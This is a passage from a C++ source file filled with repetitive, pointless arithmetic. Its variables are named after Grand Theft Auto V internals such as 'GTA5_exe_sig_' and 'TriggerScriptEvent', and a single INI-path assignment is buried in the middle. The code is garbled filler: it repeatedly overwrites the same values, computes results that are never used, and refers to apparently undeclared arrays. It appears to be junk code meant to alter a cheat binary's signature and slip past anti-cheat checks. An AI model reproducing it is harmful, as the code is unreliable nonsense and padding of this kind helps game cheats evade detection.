		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
		GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		Extern_Reader::INIFile::INIFilePath = INIPath;
		for (int i = 1; i <= 1000; i++)
		{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
